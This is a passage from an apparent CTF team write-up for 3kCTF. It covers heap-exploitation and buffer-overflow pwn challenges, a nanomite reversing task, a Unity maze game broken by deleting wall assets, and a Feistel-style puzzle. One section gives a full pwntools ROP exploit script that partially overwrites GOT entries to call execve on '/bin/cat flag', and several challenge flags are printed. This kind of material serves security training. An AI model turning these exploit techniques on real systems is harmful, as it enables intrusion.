&lt;li&gt;Solution: We utilize unsorted bin attack to write unsorted bin address to &lt;code&gt;name&lt;/code&gt;, then &lt;em&gt;relogin&lt;/em&gt; to print the content of &lt;code&gt;name&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;problem&#34;&gt;Problem&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;can&#39;t access tty; job control turned off&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Will this means we can&#39;t open the shell? Whatever, we change the approach from utilizing one gadget RCE to calling the &lt;code&gt;system&lt;/code&gt; function.
We can overwrite &lt;code&gt;__free_hook&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt;, then free a chunk with content &lt;code&gt;/bin/cat flag&lt;/code&gt;, yielding &lt;code&gt;system(&amp;quot;/bin/cat flag&amp;quot;)&lt;/code&gt;. However, if we want control &lt;code&gt;__free_hook&lt;/code&gt;, we need to try harder.
Finally, we perform fastbin attack to control &lt;code&gt;pages&lt;/code&gt; and &lt;code&gt;check_pages&lt;/code&gt;, edit the pointer of each page to an arbitrary address, and eventually we have arbitrary address write.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;3k{unlink_the_world_and_feel_the_void}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;one-and-a-half-man-pwn-493-points&#34;&gt;one and a half man (Pwn; 493 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;program-1&#34;&gt;Program&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#a6e22e&#34;&gt;vuln&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+6h] [rbp-Ah]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAAuLL&lt;/span&gt;);
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is a short function that obviously vulnerable to buffer overflow.
I have solved similar challenge before, and my approach was to overwrite first 2 byte the &lt;code&gt;read_got&lt;/code&gt; to run one gadget RCE. It involves 4 bit randomness to satisfy, hence I have a 1/16 chance to solving it.
&lt;strong&gt;It works&lt;/strong&gt;, but &lt;code&gt;can&#39;t access tty; job control turned off&lt;/code&gt;. Okay, I shouldn&#39;t forgot shell interaction is disabled from this server.&lt;/p&gt;

&lt;h3 id=&#34;exploit-2&#34;&gt;Exploit&lt;/h3&gt;

&lt;p&gt;I find a &lt;code&gt;syscall&lt;/code&gt; near the one gadget RCE so that we can jump to syscalls. It&#39;s time to construct ROP:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov eax, 0 ; pop rbp ; ret           g1(in binary)
mov edx, eax ; mov eax, edx ; ret      (in libc)
pop rdi; ret                           (in binary)
pop rsi; pop r15; ret                  (in binary)
move eax, 0x3b; syscall                (in libc)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;By this ROP chain we can set &lt;code&gt;edx&lt;/code&gt; (the third argument) to 0, control &lt;code&gt;rdi&lt;/code&gt; and &lt;code&gt;rsi&lt;/code&gt; (the first and the second arguments) and call &lt;code&gt;sys_execve&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;sys_execve(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;filename, argv[], envp[])&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To &lt;code&gt;cat flag&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;sys_execve(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cat&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cat&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;flag&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally our script:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flat(pop_rsi_r15, buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, read_plt, vuln)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(payload)
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/cat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(buf)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(buf&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;) \
            &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(string)
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)

payload2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flat(pop_rsi_r15, setvbuf_got, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, read_plt, pop_rsi_r15, read_got, \
                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, read_plt, g1, buf, setvbuf_plt, pop_rdi, buf, pop_rsi_r15, \
                buf&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, read_plt)
                ret
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; payload2)
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x5b\xd6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# (in libc) mov edx, eax ; mov eax, edx ; ret&lt;/span&gt;
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x72\x04&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# (in libc) move eax, 0x3b; syscall&lt;/span&gt;
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;3k{one_byte_and_a_half_overwrite_ftw!}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;microscopic-reverse-488-points&#34;&gt;microscopic (Reverse; 488 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Open with IDA pro. There is a curious function defined on &lt;code&gt;sub_F7C&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_F7C&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// v3 hereby is the length of the length of the target ciphertext
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    ciphertext[v2] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v3 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; input[v12]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v2;
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ciphertext[v12] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; target_ciphertext[v12];
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hereby &lt;code&gt;target_ciphertext&lt;/code&gt; is is an array of 39 integers, located on &lt;code&gt;0x202020&lt;/code&gt;. We can simply write a Python script that extract &lt;code&gt;target_ciphertext&lt;/code&gt; and compute the corresponding input.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenge/micro&amp;#39;&lt;/span&gt;)
target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x202020&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;I&amp;#39;&lt;/span&gt;, target[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;i:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;)]

target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [(c&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i)&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i, c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(target)]
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(bytes(target))
&lt;span style=&#34;color:#75715e&#34;&gt;# 3k{nan0mites_everywhere_everytime_ftw!}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;game-reversemisc-486477-points&#34;&gt;game (Reverse/Misc; 486+477 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;eriri&lt;/em&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;game 1
find your way to the heart of the maze

game 2
the shortest route is often the best&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You are given an Unity game folder at the beginning. When you start the game, you are in a dark maze. You can walk but not jump nor run. Nothing will be triggered when you walk out of the maze.&lt;/p&gt;

&lt;p&gt;I think there should be multiple ways to solve the challenge. One solution will be &lt;em&gt;physcially&lt;/em&gt; break the maze. How to do that? By deleting the walls object in the level.&lt;/p&gt;

&lt;p&gt;With &lt;a href=&#34;https://github.com/DerPopo/UABE&#34;&gt;Unity Assets Bundle Extractor&lt;/a&gt;, we are able to delete walls in &lt;code&gt;/CTF_Data/level0&lt;/code&gt; (which is level of the maze).
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/1qIvga0.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;After deleting some of the wall objects (for me I selected the &lt;code&gt;GameObject Wall&lt;/code&gt; with number greater than 100) and returning to the game, you will find a wall that marks the flag for &lt;code&gt;game 2&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/CijVLag.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;There are some characters missing in the wall because we deleted some of the characters by accident. We did a bit of guess and finally got the flag: &lt;code&gt;3K-CTF-A-MAZE-ING&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;There are also some &lt;em&gt;floating&lt;/em&gt; walls inside the maze. When you walk through it you will get a word overlayed on the top left corner.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/AanPBXV.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Decompiling &lt;code&gt;/CTF_Data/Managed/Assembly-CSharp.dll&lt;/code&gt; will get you the logic of the game.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/AwL6Bub.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;
If you find and hit the 6 walls with the right order (I guess it should be the shortest path from the starting point to the flag room), the game will output you a flag. If not, an error message will be displayed.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/jnBf3T6.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Here in UABE we found 6 assets with duplicated names. It should correspond to the 6 floating walls in the game.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/uHAzYbC.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;After some tries (with a bit of luck), we were able to get the flag for &lt;code&gt;game 1&lt;/code&gt;.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/cgF7eDj.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Flag: &lt;code&gt;3K-CTF-GamingIsNotACrime&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Reference: &lt;a href=&#34;https://github.com/imadr/Unity-game-hacking&#34;&gt;https://github.com/imadr/Unity-game-hacking&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;pyzzle-reversemisccrypto-459479-points&#34;&gt;pyzzle (Reverse/Misc/Crypto; 459+479 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;crabmony&lt;/em&gt; and &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;part-1&#34;&gt;Part 1&lt;/h3&gt;

&lt;p&gt;We are given a concrete syntax tree that is from &lt;a href=&#34;https://github.com/Instagram/LibCST&#34;&gt;LibCST&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We referred to the documentation and traverse the tree manually. Eventually we have manually parsed the tree into a Python script:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; binascii

plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exor&lt;/span&gt;(a, b):
    temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; b[i]:
            temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; temp

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BinaryToDecimal&lt;/span&gt;(binary):
    string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(binary, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; string

PT_Ascii &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ord(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; plaintext]
PT_Bin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [format(y, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;08b&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; PT_Ascii]
PT_Bin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(PT_Bin)
n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26936&lt;/span&gt;
K1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Redacted as this binary string is too long.&lt;/span&gt;
K2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Ditto&lt;/span&gt;
L1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PT_Bin[:n]
R1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PT_Bin[n:]
f1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exor(R1,K1)
R2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exor(f1, L1)
L2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; R1
f2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exor(R2, K2)
R3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exor(f2, L2)
L3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; R2
R3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Ditto&lt;/span&gt;
L3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Ditto&lt;/span&gt;
cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; R3
plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; R6
plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(plaintext, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unhexlify(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; plaintext)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(plaintext)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since we are given everything (except the plaintext), we are able to recover the plaintext by reversing the operations. We ended up with a STP file that contains the flag: &lt;code&gt;3k{almost_done_shizzle_up_my_nizzle}&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;part-2&#34;&gt;Part 2&lt;/h3&gt;

&lt;p&gt;From the STP file, apart from the flag, we have a bunch of nodes and edges. This part we are connecting the dots with Python:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse_line&lt;/span&gt;(line):
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; list(map(int, line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:]))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
  &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pyzzle2&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    lines &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
  
  edges &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(parse_line, lines[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;]))
